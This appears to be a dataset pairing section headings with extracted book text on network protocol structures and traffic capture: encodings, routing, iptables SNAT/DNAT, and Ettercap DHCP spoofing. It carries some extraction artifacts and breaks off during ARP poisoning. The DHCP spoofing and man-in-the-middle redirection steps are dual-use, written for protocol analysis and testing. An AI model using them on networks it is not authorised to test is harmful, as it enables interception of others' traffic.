    "output": "Numeric Data\nOver the millennia, science and written languages have invented ways to\nrepresent numeric values in textual format. Of course, computer protocols\ndon’t need to be human readable, but why go out of your way just to prevent\na protocol from being readable (unless your goal is deliberate obfuscation).\nIntegers\nIt’s easy to represent integer values using the current character set’s repre-\nsentation of the characters 0 through 9 (or A through F if hexadecimal). In\nthis simple representation, size limitations are no concern, and if a number\nneeds to be larger than a binary word size, you can add digits. Of course,\nyou’d better hope that the protocol parser can handle the extra digits or\nsecurity issues will inevitably occur.\nTo make a signed number, you add the minus (–) character to the front\nof the number; the plus (+) symbol for positive numbers is implied.\nDecimal Numbers\nDecimal numbers are usually defined using human-readable forms. For\nexample, you might write a number as 1.234, using the dot character to sep-\narate the integer and fractional components of the number; however, you’ll\nstill need to consider the requirement of parsing a value afterward.\nBinary representations, such as floating point, can’t represent all deci-\nmal values precisely with finite precision (just as decimals can’t represent\nnumbers like 1/3). This fact can make some values difficult to represent in\ntext format and can cause security issues, especially when values are com-\npared to one another.\nText Booleans\nBooleans are easy to represent in text protocols. Usually, they’re repre-\nsented using the words true or false. But just to be difficult, some protocols\nmight require that words be capitalized exactly to be valid. And sometimes\ninteger values will be used instead of words, such as 0 for false and 1 for\ntrue, but not very often.\nDates and Times\nAt a simple level, it’s easy to encode dates and times: just represent them as\nthey would be written in a human-readable language. As long as all applica-\ntions agree on the representation, that should suffice.\nUnfortunately, not everyone can agree on a standard format, so typi-\ncally many competing date representations are in use. This can be a partic-\nularly acute issue in applications such as mail clients, which need to process\nall manner of international date formats.\nNetwork Protocol Structures 55"
  },
  {
    "input": "Structured Text Formats",
    "output": "Variable-Length Data\nAll but the most trivial protocols must have a way to separate important text\nfields so they can be easily interpreted. When a text field is separated out of\nthe original protocol, it’s commonly referred to as a token. Some protocols\nspecify a fixed length for tokens, but it’s far more common to require some\ntype of variable-length data.\nDelimited Text\nSeparating tokens with delimiting characters is a very common way to sepa-\nrate tokens and fields that’s simple to understand and easy to construct and\nparse. Any character can be used as the delimiter (depending on the type\nof data being transferred), but whitespace is encountered most in human-\nreadable formats. That said, the delimiter doesn’t have to be whitespace.\nFor example, the Financial Information Exchange (FIX) protocol delimits\ntokens using the ASCII Start of Header (SOH) character with a value of 1.\nTerminated Text\nProtocols that specify a way to separate individual tokens must also have a\nway to define an End of Command condition. If a protocol is broken into\nseparate lines, the lines must be terminated in some way. Most well-known,\ntext-based Internet protocols are line oriented, such as HTTP and IRC; lines\ntypically delimit entire structures, such as the end of a command.\nWhat constitutes the end-of-line character? That depends on whom\nyou ask. OS developers usually define the end-of-line character as either\nthe ASCII Line Feed (LF), which has the value 10; the Carriage Return (CR)\nwith the value 13; or the combination CR LF. Protocols such as HTTP and\nSimple Mail Transfer Protocol (SMTP) specify CR LF as the official end-of-\nline combination. However, so many incorrect implementations occur that\nmost parsers will also accept a bare LF as the end-of-line indication.\nStructured Text Formats\nAs with structured binary formats such ASN.1, there is normally no reason\nto reinvent the wheel when you want to represent structured data in a text\nprotocol. You might think of structured text formats as delimited text on\nsteroids, and as such, rules must be in place for how values are represented\nand hierarchies constructed. With this in mind, I’ll describe three formats\nin common use within real-world text protocols.\nMultipurpose Internet Mail Extensions\nOriginally developed for sending multipart email messages, Multipurpose\nInternet Mail Extensions (MIME) found its way into a number of protocols,\nsuch as HTTP. The specification in RFCs 2045, 2046 and 2047, along with\nnumerous other related RFCs, defines a way of encoding multiple discrete\nattachments in a single MIME-encoded message.\n56 Chapter 3\nMIME messages separate the body parts by defining a common separa-\ntor line prefixed with two dashes (--). The message is terminated by follow-\ning this separator with the same two dashes. Listing 3-3 shows an example\nof a text message combined with a binary version of the same message.\nMIME-Version: 1.0\nContent-Type: multipart/mixed; boundary=MSG_2934894829\nThis is a message with multiple parts in MIME format.\n--MSG_2934894829\nContent-Type: text/plain\nHello World!\n--MSG_2934894829\nContent-Type: application/octet-stream\nContent-Transfer-Encoding: base64\nPGh0bWw+Cjxib2R5PgpIZWxsbyBXb3JsZCEKPC9ib2R5Pgo8L2h0bWw+Cg==\n--MSG_2934894829--\nListing 3-3: A simple MIME message\nOne of the most common uses of MIME is for Content-Type values,\nwhich are usually referred to as MIME types. A MIME type is widely used\nwhen serving HTTP content and in operating systems to map an applica-\ntion to a particular content type. Each type consists of the form of the data\nit represents, such as text or application, in the format of the data. In this\ncase, plain is unencoded text and octet-stream is a series of bytes.\nJavaScript Object Notation\nJavaScript Object Notation (JSON) was designed as a simple representation for\na structure based on the object format provided by the JavaScript program-\nming language. It was originally used to transfer data between a web page\nin a browser and a backend service, such as in Asynchronous JavaScript and\nXML (AJAX). Currently, it’s commonly used for web service data transfer\nand all manner of other protocols.\nThe JSON format is simple: a JSON object is enclosed using the braces\n({}) ASCII characters. Within these braces are zero or more member entries,\neach consisting of a key and a value. For example, Listing 3-4 shows a simple\nJSON object consisting of an integer index value, \"Hello world!\" as a string,\nand an array of strings.\n{\n\"index\" : 0,\n\"str\" : \"Hello World!\",\n\"arr\" : [ \"A\", \"B\" ]\n}\nListing 3-4: A simple JSON object\nNetwork Protocol Structures 57\nThe JSON format was designed for JavaScript processing, and it can be\nparsed using the \"eval\" function. Unfortunately, using this function comes\nwith a significant security risk; namely, it’s possible to insert arbitrary script\ncode during object creation. Although most modern applications use a pars-\ning library that doesn’t need a connection to JavaScript, it’s worth ensuring\nthat arbitrary JavaScript code is not executed in the context of the applica-\ntion. The reason is that it could lead to potential security issues, such as cross-\nsite scripting (XSS), a vulnerability where attacker-controlled JavaScript can be\nexecuted in the context of another web page, allowing the attacker to access\nthe page’s secure resources.\nExtensible Markup Language\nExtensible Markup Language (XML) is a markup language for describing\na structured document format. Developed by the W3C, it’s derived from\nStandard Generalized Markup Language (SGML). It has many similarities\nto HTML, but it aims to be stricter in its definition in order to simplify\nparsers and create fewer security issues.1\nAt a basic level, XML consists of elements, attributes, and text. Elements\nare the main structural values. They have a name and can contain child\nelements or text content. Only one root element is allowed in a single docu-\nment. Attributes are additional name-value pairs that can be assigned to an\nelement. They take the form of name=\"Value\". Text content is just that, text.\nText is a child of an element or the value component of an attribute.\nListing 3-5 shows a very simple XML document with elements, attri-\nbutes, and text values.\n<value index=\"0\"> <str>Hello World!</str>\n<arr><value>A</value><value>B</value></arr>\n</value>\nListing 3-5: A simple XML document\nAll XML data is text; no type information is provided for in the XML\nspecification, so the parser must know what the values represent. Certain\nspecifications, such as XML Schema, aim to remedy this type information\ndeficiency but they are not required in order to process XML content. The\nXML specification defines a list of well-formed criteria that can be used to\ndetermine whether an XML document meets a minimal level of structure.\nXML is used in many different places to define the way informa-\ntion is transmitted in a protocol, such as in Rich Site Summary (RSS). It\ncan also be part of a protocol, as in Extensible Messaging and Presence\nProtocol (XMPP).\n1. Just ask those who have tried to parse HTML for errant script code how difficult that task\ncan be without a strict format.\n58 Chapter 3"
  },
  {
    "input": "Hex Encoding",
    "output": "encoding Binary data\nIn the early history of computer communication, 8-bit bytes were not\nthe norm. Because most communication was text based and focused on\nEnglish-speaking countries, it made economic sense to send only 7 bits per\nbyte as required by the ASCII standard. This allowed other bits to provide\ncontrol for serial link protocols or to improve performance. This history\nis reflected heavily in some early network protocols, such as the SMTP or\nNetwork News Transfer Protocol (NNTP), which assume 7-bit communica-\ntion channels.\nBut a 7-bit limitation presents a problem if you want to send that amus-\ning picture to your friend via email or you want to write your mail in a non-\nEnglish character set. To overcome this limitation, developers devised a\nnumber of ways to encode binary data as text, each with varying degrees of\nefficiency or complexity.\nAs it turns out, the ability to convert binary content into text still has its\nadvantages. For example, if you wanted to send binary data in a structured\ntext format, such as JSON or XML, you might need to ensure that delimit-\ners were appropriately escaped. Instead, you can choose an existing encod-\ning format, such as Base64, to send the binary data and it will be easily\nunderstood on both sides.\nLet’s look at some of the more common binary-to-text encoding schemes\nyou’re likely to encounter when inspecting a text protocol.\nHex Encoding\nOne of the most naive encoding techniques for binary data is hex encoding.\nIn hex encoding, each octet is split into two 4-bit values that are converted to\ntwo text characters denoting the hexadecimal representation. The result is a\nsimple representation of the binary in text form, as shown in Figure 3-18.\n0x06 0xE3 0x58\n0 0 0 0 0 1 1 0 1 1 1 0 0 0 1 1 0 1 0 1 1 0 0 0\n'0' '6' 'E' '3' '5' '8'\nFigure 3-18: Example hex encoding of binary data\nAlthough simple, hex encoding is not space efficient because all\nbinary data automatically becomes 100 percent larger than it was origi-\nnally. But one advantage is that encoding and decoding operations are\nfast and simple and little can go wrong, which is definitely beneficial from\na security perspective.\nNetwork Protocol Structures 59"
  },
  {
    "input": "Base64",
    "output": "HTTP specifies a similar encoding for URLs and some text protocols\ncalled percent encoding. Rather than all data being encoded, only nonprint-\nable data is converted to hex, and values are signified by prefixing the value\nwith a % character. If percent encoding was used to encode the value in\nFigure 3-18, you would get %06%E3%58.\nBase64\nTo counter the obvious inefficiencies in hex encoding, we can use Base64,\nan encoding scheme originally developed as part of the MIME specifica-\ntions. The 64 in the name refers to the number of characters used to\nencode the data.\nThe input binary is separated into individual 6-bit values, enough to\nrepresent 0 through 63. This value is then used to look up a corresponding\ncharacter in an encoding table, as shown in Figure 3-19.\nLower 4 bits\n0 1 2 3 4 5 6 7 8 9 A B C D E F\n0\n1\n2\n3\n60 Chapter 3\nstib\n2\nreppU\nA B C D E F G H I J K L M N O P\nQ R S T U V W X Y Z a b c d e f\ng h i j k l m n o p q r s t u v\nw x y z 0 1 2 3 4 5 6 7 8 9 + /\nFigure 3-19: Base64 encoding table\nBut there’s a problem with this approach: when 8 bits are divided by 6,\n2 bits remain. To counter this problem, the input is taken in units of three\noctets, because dividing 24 bits by 6 bits produces 4 values. Thus, Base64\nencodes 3 bytes into 4, representing an increase of only 33 percent, which is\nsignificantly better than the increase produced by hex encoding. Figure 3-20\nshows an example of encoding a three-octet sequence into Base64.\nBut yet another issue is apparent with this strategy. What if you have\nonly one or two octets to encode? Would that not cause the encoding to\nfail? Base64 gets around this issue by defining a placeholder character,\nthe equal sign (=). If in the encoding process, no valid bits are available\nto use, the encoder will encode that value as the placeholder. Figure 3-21\nshows an example of only one octet being encoded. Note that it generates\ntwo placeholder characters. If two octets were encoded, Base64 would\ngenerate only one.\n0x06 0xE3 0x58\n0 0 0 0 0 1 1 0 1 1 1 0 0 0 1 1 0 1 0 1 1 0 0 0\n0x01 0x2E 0x0D 0x18\nBase64 mapping table\n'B' 'u' 'N' 'Y'\nFigure 3-20: Base64 encoding 3 bytes as 4 characters\n0x06\n0 0 0 0 0 1 1 0 0 0 0 0 X X X X X X X X X X X X\n0x01 0x20 ? ?\nBase64 mapping table\n'B' 'g' '=' ''==''\nFigure 3-21: Base64 encoding 1 byte as 3 characters\nTo convert Base64 data back into binary, you simply follow the steps\nin reverse. But what happens when a non-Base64 character is encountered\nduring the decoding? Well that’s up to the application to decide. We can\nonly hope that it makes a secure decision.\nNetwork Protocol Structures 61"
  },
  {
    "input": "Final Words",
    "output": "Final words\nIn this chapter, I defined many ways to represent data values in binary\nand text protocols and discussed how to represent numeric data, such as\nintegers, in binary. Understanding how octets are transmitted in a pro-\ntocol is crucial to successfully decoding values. At the same time, it’s also\nimportant to identify the many ways that variable-length data values can\nbe represented because they are perhaps the most important structure you\nwill encounter within a network protocol. As you analyze more network pro-\ntocols, you’ll see the same structures used repeatedly. Being able to quickly\nidentify the structures is key to easily processing unknown protocols.\nIn Chapter 4, we’ll look at a few real-world protocols and dissect them\nto see how they match up with the descriptions presented in this chapter.\n62 Chapter 3"
  },
  {
    "input": "Chapter 4: Advanced Application Traffic Capture\r",
    "output": "4\nADvANCED APPLICATION\nTR AffIC C APTuRE\nUsually, the network traffic-capturing techniques you\nlearned in Chapter 2 should suffice, but occasionally\nyou’ll encounter tricky situations that require more\nadvanced ways to capture network traffic. Sometimes,\nthe challenge is an embedded platform that can only\nbe configured with the Dynamic Host Configuration\nProtocol (DHCP); other times, there may be a network\nthat offers you little control unless you’re directly con-\nnected to it.\nMost of the advanced traffic-capturing techniques discussed in this\nchapter use existing network infrastructure and protocols to redirect traf-\nfic. None of the techniques require specialty hardware; all you’ll need are\nsoftware packages commonly found on various operating systems."
  },
  {
    "input": "Using Traceroute",
    "output": "rerouting traffic\nIP is a routed protocol; that is, none of the nodes on the network need to\nknow the exact location of any other nodes. Instead, when one node wants\nto send traffic to another node that it isn’t directly connected to, it sends\nthe traffic to a gateway node, which forwards the traffic to the destination.\nA gateway is also commonly called a router, a device that routes traffic from\none location to another.\nFor example, in Figure 4-1, the client 192.168.56.10 is trying to send\ntraffic to the server 10.1.1.10, but the client doesn’t have a direct connec-\ntion to the server. It first sends traffic destined for the server to Router A. In\nturn, Router A sends the traffic to Router B, which has a direct connection\nto the target server; Router B passes the traffic on to its final destination.\nAs with all nodes, the gateway node doesn’t know the traffic’s exact des-\ntination, so it looks up the appropriate next gateway to send to. In this case,\nRouters A and B only know about the two networks they are directly con-\nnected to. To get from the client to the server, the traffic must be routed.\nNetwork 192.168.56.0 Network 172.16.0.0 Network 10.0.0.0\nRouter Router\nA B\nTraffic to Forward to Traffic to\n10.1.1.10 10.1.1.10 10.1.1.10\nClient: 192.168.56.10 Server 10.1.1.10\nFigure 4-1: An example of routed traffic\nUsing Traceroute\nWhen tracing a route, you attempt to map the route that the IP traffic will\ntake to a particular destination. Most operating systems have built-in tools to\nperform a trace, such as traceroute on most Unix-like platforms and tracert\non Windows.\nListing 4-1 shows the result of tracing the route to www.google.com from\na home internet connection.\nC:\\Users\\user>tracert www.google.com\nTracing route to www.google.com [173.194.34.176]\nover a maximum of 30 hops:\n1 2 ms 2 ms 2 ms home.local [192.168.1.254]\n2 15 ms 15 ms 15 ms 217.32.146.64\n3 88 ms 15 ms 15 ms 217.32.146.110\n4 16 ms 16 ms 15 ms 217.32.147.194\n5 26 ms 15 ms 15 ms 217.41.168.79\n6 16 ms 26 ms 16 ms 217.41.168.107\n64 Chapter 4"
  },
  {
    "input": "Routing Tables",
    "output": "7 26 ms 15 ms 15 ms 109.159.249.94\n8 18 ms 16 ms 15 ms 109.159.249.17\n9 17 ms 28 ms 16 ms 62.6.201.173\n10 17 ms 16 ms 16 ms 195.99.126.105\n11 17 ms 17 ms 16 ms 209.85.252.188\n12 17 ms 17 ms 17 ms 209.85.253.175\n13 27 ms 17 ms 17 ms lhr14s22-in-f16.1e100.net [173.194.34.176]\nListing 4-1: Traceroute to www .google .com using the tracert tool\nEach numbered line of output (1, 2, and so on) represents a unique\ngateway routing traffic to the ultimate destination. The output refers to a\nmaximum number of hops. A single hop represents the network between\neach gateway in the entire route. For example, there’s a hop between your\nmachine and the first router, another between that router and the next,\nand hops all the way to the final destination. If the maximum hop count is\nexceeded, the traceroute process will stop probing for more routers. The\nmaximum hop can be specified to the trace route tool command line; spec-\nify -h NUM on Windows and -m NUM on Unix-style systems.(The output also\nshows the round-trip time from the machine performing the traceroute\nand the discovered node.)\nRouting Tables\nThe OS uses routing tables to figure out which gateways to send traffic to.\nA routing table contains a list of destination networks and the gateway\nto route traffic to. If a network is directly connected to the node sending\nthe network traffic, no gateway is required, and the network traffic can be\ntransmitted directly on the local network.\nYou can view your computer’s routing table by entering the command\nnetstat -r on most Unix-like systems or route print on Windows. Listing 4-2\nshows the output from Windows when you execute this command.\n> route print\nIPv4 Route Table\n=============================================================================\nActive Routes:\nNetwork Destination Netmask Gateway Interface Metric\n 0.0.0.0 0.0.0.0 192.168.1.254 192.168.1.72 10\n127.0.0.0 255.0.0.0 On-link 127.0.0.1 306\n127.0.0.1 255.255.255.255 On-link 127.0.0.1 306\n127.255.255.255 255.255.255.255 On-link 127.0.0.1 306\n192.168.1.0 255.255.255.0 On-link 192.168.1.72 266\n192.168.1.72 255.255.255.255 On-link 192.168.1.72 266\n192.168.1.255 255.255.255.255 On-link 192.168.1.72 266\n224.0.0.0 240.0.0.0 On-link 127.0.0.1 306\n224.0.0.0 240.0.0.0 On-link 192.168.56.1 276\n224.0.0.0 240.0.0.0 On-link 192.168.1.72 266\n255.255.255.255 255.255.255.255 On-link 127.0.0.1 306\n255.255.255.255 255.255.255.255 On-link 192.168.56.1 276\nAdvanced Application Traffic Capture 65"
  },
  {
    "input": "Configuring a Router",
    "output": "255.255.255.255 255.255.255.255 On-link 192.168.1.72 266\n=============================================================================\nListing 4-2: Example routing table output\nAs mentioned earlier, one reason routing is used is so that nodes don’t\nneed to know the location of all other nodes on the network. But what hap-\npens to traffic when the gateway responsible for communicating with the\ndestination network isn’t known? In that case, it’s common for the routing\ntable to forward all unknown traffic to a default gateway. You can see the\ndefault gateway at , where the network destination is 0.0.0.0. This destina-\ntion is a placeholder for the default gateway, which simplifies the manage-\nment of the routing table. By using a placeholder, the table doesn’t need to\nbe changed if the network configuration changes, such as through a DHCP\nconfiguration. Traffic sent to any destination that has no known match-\ning route will be sent to the gateway registered for the 0.0.0.0 placeholder\naddress.\nHow can you use routing to your advantage? Let’s consider an embed-\nded system in which the operating system and hardware come as one single\ndevice. You might not be able to influence the network configuration in\nan embedded system as you might not even have access to the underlying\noperating system, but if you can present your capturing device as a gateway\nbetween the system generating the traffic and its ultimate destination, you\ncan capture the traffic on that system.\nThe following sections discuss ways to configure an OS to act as a gate-\nway to facilitate traffic capture.\nconfiguring a router\nBy default, most operating systems do not route traffic directly between\nnetwork interfaces. This is mainly to prevent someone on one side of the\nroute from communicating directly with the network addresses on the\nother side. If routing is not enabled in the OS configuration, any traffic\nsent to one of the machine’s network interfaces that needs to be routed is\ninstead dropped or an error message is sent to the sender. The default con-\nfiguration is very important for security: imagine the implications if the\nrouter controlling your connection to the internet routed traffic from the\ninternet directly to your private network.\nTherefore, to enable an OS to perform routing, you need to make some\nconfiguration changes as an administrator. Although each OS has differ-\nent ways of enabling routing, one aspect remains constant: you’ll need at\nleast two separate network interfaces installed in your computer to act as\na router. In addition, you’ll need routes on both sides of the gateway for\nrouting to function correctly. If the destination doesn’t have a correspond-\ning route back to the source device, communication might not work as\nexpected. Once routing is enabled, you can configure the network devices\n66 Chapter 4"
  },
  {
    "input": "Enabling Routing on *nix",
    "output": "to forward traffic via your new router. By running a tool such as Wireshark\non the router, you can capture traffic as it’s forwarded between the two net-\nwork interfaces you configured.\nEnabling Routing on Windows\nBy default, Windows does not enable routing between network interfaces.\nTo enable routing on Windows, you need to modify the system registry. You\ncan do this by using a GUI registry editor, but the easiest way is to run the\nfollowing command as an administrator from the command prompt:\nC> reg add HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters ^\n/v IPEnableRouter /t REG_DWORD /d 1\nTo turn off routing after you’ve finished capturing traffic, enter the fol-\nlowing command:\nC> reg add HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters ^\n/v IPEnableRouter /t REG_DWORD /d 0\nYou’ll also need to reboot between command changes.\nWARNING Be very careful when you’re modifying the Windows registry. Incorrect changes could\ncompletely break Windows and prevent it from booting! Be sure to make a system\nbackup using a utility like the built-in Windows backup tool before performing any\ndangerous changes.\nEnabling Routing on *nix\nTo enable routing on Unix-like operating systems, you simply change the\nIP routing system setting using the sysctl command. (Note that the instruc-\ntions for doing so aren’t necessarily consistent between systems, but you\nshould be able to easily find specific instructions.)\nTo enable routing on Linux for IPv4, enter the following command as\nroot (no need to reboot; the change is immediate):\n# sysctl net.ipv4.conf.all.forwarding=1\nTo enable IPv6 routing on Linux, enter this:\n# sysctl net.ipv6.conf.all.forwarding=1\nYou can revert the routing configuration by changing 1 to 0 in the pre-\nvious commands.\nTo enable routing on macOS, enter the following:\n> sysctl -w net.inet.ip.forwarding=1\nAdvanced Application Traffic Capture 67"
  },
  {
    "input": "Enabling SNAT",
    "output": "network address translation\nWhen trying to capture traffic, you may find that you can capture out-\nbound traffic but not returning traffic. The reason is that an upstream\nrouter doesn’t know the route to the original source network; therefore,\nit either drops the traffic entirely or forwards it to an unrelated network.\nYou can mitigate this situation by using Network Address Translation (NAT),\na technique that modifies the source and destination address information\nof IP and higher-layer protocols, such as TCP. NAT is used extensively to\nextend the limited IPv4 address space by hiding multiple devices behind a\nsingle public IP address.\nNAT can make network configuration and security easier, too. When\nNAT is turned on, you can run as many devices behind a single NAT IP\naddress as you like and manage only that public IP address.\nTwo types of NAT are common today: Source NAT (SNAT) and Destination\nNAT (DNAT). The differences between the two relate to which address is\nmodified during the NAT processing of the network traffic. SNAT (also\ncalled masquerading) changes the IP source address information; DNAT\nchanges the destination address.\nEnabling SNAT\nWhen you want a router to hide multiple machines behind a single\nIP address, you use SNAT. When SNAT is turned on, as traffic is routed\nacross the external network interface, the source IP address in the packets\nis rewritten to match the single IP address made available by SNAT.\nIt can be useful to implement SNAT when you want to route traffic to\na network that you don’t control because, as you’ll recall, both nodes on the\nnetwork must have appropriate routing information for network traffic to\nbe sent between the nodes. In the worst case, if the routing information is\nincorrect, traffic will flow in only one direction. Even in the best case, it’s\nlikely that you would be able to capture traffic only in one direction; the\nother direction would be routed through an alternative path.\nSNAT addresses this potential problem by changing the source address\nof the traffic to an IP address that the destination node can route to—typi-\ncally, the one assigned to the external interface of the router. Thus, the des-\ntination node can send traffic back in the direction of the router. Figure 4-2\nshows a simple example of SNAT.\nClient (10.0.0.1) Router (1.1.1.1) Server (domain.com)\nTraffic from 10.0.0.1 Traffic from 1.1.1.1\nto domain.com to domain.com\nFigure 4-2: An example of SNAT from a client to a server\nWhen the client wants to send a packet to a server on a different net-\nwork, it sends it to the router that has been configured with SNAT. When\n68 Chapter 4"
  },
  {
    "input": "Configuring SNAT on Linux",
    "output": "the router receives the packet from the client, the source address is the\nclient’s (10.0.0.1) and the destination is the server (the resolved address\nof domain.com). It’s at this point that SNAT is used: the router modifies\nthe source address of the packet to its own (1.1.1.1) and then forwards the\npacket to the server.\nWhen the server receives this packet, it assumes the packet came from\nthe router; so, when it wants to send a packet back, it sends the packet to\n1.1.1.1. The router receives the packet, determines it came from an existing\nNAT connection (based on destination address and port numbers), and\nreverts the address change, converting 1.1.1.1 back to the original client\naddress of 10.0.0.1. Finally, the packet can be forwarded back to the origi-\nnal client without the server needing to know about the client or how to\nroute to its network.\nConfiguring SNAT on Linux\nAlthough you can configure SNAT on Windows and macOS using Internet\nConnection Sharing, I’ll only provide details on how to configure SNAT\non Linux because it’s the easiest platform to describe and the most flexible\nwhen it comes to network configuration.\nBefore configuring SNAT, you need to do the following:\n• Enable IP routing as described earlier in this chapter.\n• Find the name of the outbound network interface on which you want\nto configure SNAT. You can do so by using the ifconfig command. The\noutbound interface might be named something like eth0.\n• Note the IP address associated with the outbound interface when you\nuse ifconfig.\nNow you can configure the NAT rules using the iptables. (The iptables\ncommand is most likely already installed on your Linux distribution.) But\nfirst, flush any existing NAT rules in iptables by entering the following com-\nmand as the root user:\n# iptables -t nat -F\nIf the outbound network interface has a fixed address, run the fol-\nlowing commands as root to enable SNAT. Replace INTNAME with the name\nof your outbound interface and INTIP with the IP address assigned to that\ninterface.\n# iptables -t nat -A POSTROUTING -o INTNAME -j SNAT --to INTIP\nHowever, if the IP address is configured dynamically (perhaps using\nDHCP or a dial-up connection), use the following command to automati-\ncally determine the outbound IP address:\n# iptables -t nat -A POSTROUTING -o INTNAME -j MASQUERADE\nAdvanced Application Traffic Capture 69"
  },
  {
    "input": "Enabling DNAT",
    "output": "Enabling DNAT\nDNAT is useful if you want to redirect traffic to a proxy or other service\nto terminate it, or before forwarding the traffic to its original destination.\nDNAT rewrites the destination IP address, and optionally, the destination\nport. You can use DNAT to redirect specific traffic to a different destina-\ntion, as shown in Figure 4-3, which illustrates traffic being redirected from\nboth the router and the server to a proxy at 192.168.0.10 to perform a man-\nin-the-middle analysis.\nClient application Router Server (domain.com:1234)\nTraffic to\nOriginal route\ndomain.com:1234\nDNAT to\n192.168.0.10:8888\nRedirected route\nProxy (192.168.0.10:8888)\nFigure 4-3: An example of DNAT to a proxy\nFigure 4-3 shows a client application sending traffic through a router\nthat is destined for domain.com on port 1234. When a packet is received\nat the router, that router would normally just forward the packet to the\noriginal destination. But because DNAT is used to change the packet’s\ndestination address and port to 192.168.0.10:8888, the router will apply its\nforwarding rules and send the packet to a proxy machine that can capture\nthe traffic. The proxy then establishes a new connection to the server and\nforwards any packets sent from the client to the server. All traffic between\nthe original client and the server can be captured and manipulated.\nConfiguring DNAT depends on the OS the router is running. (If\nyour router is running Windows, you’re probably out of luck because the\nfunctionality required to support it isn’t exposed to the user.) Setup varies\nconsiderably between different versions of Unix-like operating systems and\nmacOS, so I’ll only show you how to configure DNAT on Linux. First, flush\nany existing NAT rules by entering the following command:\n# iptables -t nat -F\nNext, run the following command as the root user, replacing ORIGIP\n(originating IP) with the IP address to match traffic to and NEWIP with the\nnew destination IP address you want that traffic to go to.\n70 Chapter 4"
  },
  {
    "input": "DHCP Spoofing",
    "output": "# iptables -t nat -A PREROUTING -d ORIGIP -j DNAT --to-destination NEWIP\nThe new NAT rule will redirect any packet routed to ORIGIP to NEWIP.\n(Because the DNAT occurs prior to the normal routing rules on Linux, it’s\nsafe to choose a local network address; the DNAT rule will not affect traffic\nsent directly from Linux.) To apply the rule only to a specific TCP or UDP,\nchange the command:\niptables -t nat -A PREROUTING -p PROTO -d ORIGIP --dport ORIGPORT -j DNAT \\\n--to-destination NEWIP:NEWPORT\nThe placeholder PROTO (for protocol) should be either tcp or udp depend-\ning on the IP protocol being redirected using the DNAT rule. The values\nfor ORIGIP (original IP) and NEWIP are the same as earlier.\nYou can also configure ORIGPORT (the original port) and NEWPORT if you\nwant to change the destination port. If NEWPORT is not specified, only the IP\naddress will be changed.\nForwarding traffic to a gateway\nYou’ve set up your gateway device to capture and modify traffic. Everything\nappears to be working properly, but there’s a problem: you can’t easily\nchange the network configuration of the device you want to capture. Also,\nyou have limited ability to change the network configuration the device is\nconnected to. You need some way to reconfigure or trick the sending device\ninto forwarding traffic through your gateway. You could accomplish this by\nexploiting the local network by spoofing packets for either DHCP or Address\nResolution Protocol (ARP).\nDHCP Spoofing\nDHCP is designed to run on IP networks to distribute network configuration\ninformation to nodes automatically. Therefore, if we can spoof DHCP traf-\nfic, we can change a node’s network configuration remotely. When DHCP is\nused, the network configuration pushed to a node can include an IP address\nas well as the default gateway, routing tables, the default DNS servers, and\neven additional custom parameters. If the device you want to test uses DHCP\nto configure its network interface, this flexibility makes it very easy to supply\na custom configuration that will allow easy network traffic capture.\nDHCP uses the UDP protocol to send requests to and from a DHCP ser-\nvice on the local network. Four types of DHCP packets are sent when nego-\ntiating the network configuration:\nDiscover Sent to all nodes on the IP network to discover a DHCP\nserver\nOffer Sent by the DHCP server to the node that sent the discovery\npacket to offer a network configuration\nAdvanced Application Traffic Capture 71\nRequest Sent by the originating node to confirm its acceptance of the\noffer\nAcknowledgment Sent by the server to confirm completion of the\nconfiguration\nThe interesting aspect of DHCP is that it uses an unauthenticated, con-\nnectionless protocol to perform configuration. Even if an existing DHCP\nserver is on a network, you may be able to spoof the configuration process\nand change the node’s network configuration, including the default gate-\nway address, to one you control. This is called DHCP spoofing.\nTo perform DHCP spoofing, we’ll use Ettercap, a free tool that’s\navailable on most operating systems (although Windows isn’t officially\nsupported).\n1. On Linux, start Ettercap in graphical mode as the root user:\n# ettercap -G\nYou should see the Ettercap GUI, as shown in Figure 4-4.\nFigure 4-4: The main Ettercap GUI\n2. Configure Ettercap’s sniffing mode by selecting Sniff4Unified\nSniffing.\n72 Chapter 4\n3. The dialog shown in Figure 4-5 should prompt you to select the net-\nwork interface you want to sniff on. Select the interface connected to\nthe network you want to perform DHCP spoofing on. (Make sure the\nnetwork interface’s network is configured correctly because Ettercap\nwill automatically send the interface’s configured IP address as the\nDHCP default gateway.)\nFigure 4-5: Selecting the sniffing interface\n4. Enable DHCP spoofing by choosing Mitm4Dhcp spoofing. The dia-\nlog shown in Figure 4-6 should appear, allowing you to configure the\nDHCP spoofing options.\nFigure 4-6: Configuring DHCP spoofing\n5. The IP Pool field sets the range of IP addresses to hand out for spoof-\ning DHCP requests. Supply a range of IP addresses that you config-\nured for the network interface that is capturing traffic. For example,\nin Figure 4-6, the IP Pool value is set to 10.0.0.10-50 (the dash indi-\ncates all addresses inclusive of each value), so we’ll hand out IPs from\n10.0.0.10 to 10.0.0.50 inclusive. Configure the Netmask to match your\nnetwork interface’s netmask to prevent conflicts. Specify a DNS server\nIP of your choice.\n6. Start sniffing by choosing Start4Start sniffing. If DHCP spoofing\nis successful on the device, the Ettercap log window should look like\nFigure 4-7. The crucial line is fake ACK sent by Ettercap in response to\nthe DHCP request.\nAdvanced Application Traffic Capture 73"
  },
  {
    "input": "ARP Poisoning",
    "output": "Figure 4-7: Successful DHCP spoofing\nThat’s all there is to DHCP spoofing with Ettercap. It can be very pow-\nerful if you don’t have any other option and a DHCP server is already on the\nnetwork you’re trying to attack.\nARP Poisoning\nARP is critical to the operation of IP networks running on Ethernet\nbecause ARP finds the Ethernet address for a given IP address. Without\nARP, it would be very difficult to communicate IP traffic efficiently over\nEthernet. Here’s how ARP works: when one node wants to communicate\nwith another on the same Ethernet network, it must be able to map the\nIP address to an Ethernet MAC address (which is how Ethernet knows\nthe destination node to send traffic to). The node generates an ARP\nrequest packet (see Figure 4-8) containing the node’s 6-byte Ethernet\nMAC address, its current IP address, and the target node’s IP address. The\npacket is transmitted on the Ethernet network with a destination MAC\naddress of ff:ff:ff:ff:ff:ff, which is the defined broadcast address. Normally,\nan Ethernet device only processes packets with a destination address that\nmatches its address, but if it receives a packet with the destination MAC\naddress set to the broadcast address, it will process it, too.\nIf one of the recipients of this broadcasted message has been assigned\nthe target IP address, it can now return an ARP response, as shown in\nFigure 4-9. This response is almost exactly the same as the request except\nthe sender and target fields are reversed. Because the sender’s IP address\nshould correspond to the original requested target IP address, the original\n74 Chapter 4\nrequestor can now extract the sender’s MAC address and remember it for\nfuture network communication without having to resend the ARP request.\nFigure 4-8: An 